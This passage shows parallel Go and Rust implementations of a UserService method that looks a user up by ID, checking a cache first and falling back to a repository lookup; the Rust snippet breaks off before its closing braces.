    ```go [service.go]
    func (s *UserService) GetUser(ctx context.Context, id string) (*User, error) {
        if s.cache != nil {
            if cached, err := s.cache.Get(ctx, "user:"+id); err == nil {
                return cached.(*User), nil
            }
        }
        user, err := s.repo.FindByID(ctx, id)
        if err != nil {
            return nil, fmt.Errorf("get user: %w", err)
        }
        if user != nil && s.cache != nil {
            s.cache.Set(ctx, "user:"+id, user, time.Hour)
        }
        return user, nil
    }
    ```

    ```rust [service.rs]
    impl UserService {
        pub async fn get_user(&self, user_id: &str) -> Result<Option<User>> {
            let key = format!("user:{}", user_id);
            if let Some(ref cache) = self.cache {
                if let Ok(Some(cached)) = cache.get::<User>(&key).await {
                    return Ok(Some(cached));
                }
            }
            let user = self.repository.find_by_id(user_id).await?;
            if let (Some(ref u), Some(ref cache)) = (&user, &self.cache) {
                cache.set(&key, u, 3600).await?;
            }
            Ok(user)
    ```
